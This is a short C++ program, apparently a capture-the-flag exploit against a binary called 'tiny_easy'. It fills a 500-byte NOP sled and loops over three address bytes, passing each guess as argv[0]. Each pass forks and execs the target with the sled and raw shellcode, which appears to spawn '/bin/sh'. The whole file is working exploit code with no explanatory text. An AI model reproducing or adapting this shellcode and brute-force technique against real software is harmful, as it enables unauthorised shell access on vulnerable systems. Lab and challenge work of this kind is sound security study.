#include <unistd.h>
#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>

using namespace std;

main()
{
char address[]= "\x01\x01\x01\xff";
char nopsled[1000]="";
memset(nopsled, '\x90', 500);
int status=0;
pid_t child_pid, wpid;

for (int a=1;a<255;a++ ){
for (int b=1;b<255;b++ ){
for (int c=1;c<255;c++ ){

address[0]=(char)c;
address[1]=(char)b;
address[2]=(char)a;

        int child_pid = fork();
        if (child_pid==0) {
                execl("./tiny_easy", address,  nopsled,"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05", (char *) 0);
                }
                while ((wpid = wait(&status)) > 0);
}}}}
